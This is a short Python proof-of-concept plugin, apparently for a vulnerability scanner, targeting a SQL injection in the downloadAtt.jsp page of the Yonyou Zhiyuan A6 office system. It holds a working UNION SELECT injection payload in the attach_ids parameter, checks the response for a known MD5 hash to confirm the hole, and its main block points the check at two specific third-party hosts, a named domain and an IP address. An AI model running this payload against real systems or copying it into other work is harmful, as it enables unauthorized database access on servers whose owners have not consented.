#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
POC Name  :  用友致远A6/yyoa/ext/trafaxserver/downloadAtt.jsp sql注入
Author    :  a
mail      :  a@lcx.cc
refer     :  http://www.wooyun.org/bugs/wooyun-2015-0108235

"""

def assign(service, arg):
    if service == "yongyou_zhiyuan_a6":
        return True, arg

def audit(arg):
    url = 'yyoa/ext/trafaxserver/downloadAtt.jsp?attach_ids=(1)%20and%201=2%20union%20select%201,2,3,4,5,md5(123),7--'
    target = arg + url
    code, head, res, errcode, _ = curl.curl2(target)
    if code ==200 and '202cb962ac59075b964b07152d234b70' in res :
        security_hole(arg)

if __name__ == '__main__':
    from dummy import *
    audit(assign('yongyou_zhiyuan_a6', 'http://oa.wnq.com.cn/')[1])
    audit(assign('yongyou_zhiyuan_a6', 'http://110.167.194.10:8081/')[1])